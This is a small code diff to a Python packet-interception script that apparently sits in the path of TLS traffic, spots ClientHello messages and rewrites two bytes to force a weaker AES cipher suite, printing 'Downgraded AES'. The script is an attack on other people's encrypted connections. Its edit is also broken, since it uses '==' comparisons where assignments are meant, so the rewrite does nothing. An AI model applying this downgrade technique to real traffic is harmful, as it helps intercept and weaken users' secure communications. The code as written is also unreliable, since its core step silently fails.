@@ -13,10 +13,11 @@ def print_and_accept(pkt):
         payload = ip["Raw"].load
 
         if payload[0] == 0x16 and payload[5] == 0x01:
-            payload[112] == 0x00
-            payload[113] == 0x2f
+            new_payload = [x for x in payload]
+            new_payload[112] == 0x00
+            new_payload[113] == 0x2f
             print("Downgraded AES")
-            pkt.set_payload(payload)
+            pkt.set_payload(bytes(new_payload))
     
     pkt.accept()
 
